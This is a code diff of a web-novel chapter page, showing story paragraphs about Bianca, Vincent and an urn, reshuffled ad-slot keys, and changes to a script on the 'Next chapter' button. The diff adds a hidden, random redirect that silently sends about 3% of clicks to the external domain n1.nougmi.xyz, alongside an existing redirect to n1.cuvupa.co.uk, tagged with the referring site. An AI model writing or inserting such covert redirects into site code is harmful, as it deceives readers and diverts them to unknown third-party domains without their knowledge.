@@ -2390,17 +2390,17 @@
                 <p>Memories of that day at the cemetery flooded back. His first love was already gone—Bianca was the only obsession he had left.</p>
                 <p>He couldn&#39;t risk it.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>When Bianca knocked his coat to the ground for the third time, Vincent bent to pick it up. &#34;Put this on. I&#39;ll leave immediately.&#34;</p>
                 <p>Bianca finally took it but refused to wear it.</p>
                 <p>Dark fury churned in Vincent&#39;s eyes, yet he forced it down. The clock struck 3:59 AM.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Evelyn helped Bianca into the car. Through the rear window, she watched Vincent&#39;s figure grow smaller until it vanished into the pre-dawn darkness.</p>
                 <p>The driver&#39;s hands trembled on the wheel. &#34;Miss, should we call the police? That man&#39;s stare was terrifying...&#34;</p>
                 <p>&#34;No need.&#34; Bianca clutched the porcelain urn to her chest, her voice feather-light.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>At Hudson City Airport, Alexander Hamilton had been waiting for hours.</p>
                 <p>Bianca&#39;s face was deathly pale, yet she insisted on going straight to the cemetery. The moment they stepped out of the terminal, she collapsed—but never loosened her grip on the urn.</p>
                 <p>When she woke again, sunlight filled the room.</p>
@@ -2410,7 +2410,7 @@
                 <p>Bianca stared at the ceiling&#39;s intricate patterns, her throat burning. &#34;Is this... the Hamilton residence?&#34;</p>
                 <p>&#34;Yes.&#34; Evelyn handed her a glass of water. &#34;Aunt Margaret prepared this guest room herself. It overlooks the garden.&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>On the nightstand, the celadon urn gleamed in the morning light.</p>
                 <p>Bianca&#39;s fingers trembled. &#34;I shouldn&#39;t have brought this here...&#34;</p>
                 <p>&#34;Aunt Margaret said it&#39;s fine.&#34; Evelyn placed a pill in her palm. &#34;Alexander has already gone to the cemetery. Your parents have been notified too.&#34;</p>
@@ -2420,7 +2420,7 @@
                 <p>&#34;He wasn&#39;t afraid I&#39;d die.&#34; She traced the urn&#39;s smooth surface. &#34;He was afraid his collection would lose another piece.&#34;</p>
                 <p>&#34;Ever heard of gaslighting?&#34; Bianca lifted her chin, her smile razor-sharp. &#34;Too bad this time, the one going mad won&#39;t be me.&#34;</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
             </div>
             
             <div class="font-controls">
@@ -2542,7 +2542,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2558,8 +2558,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
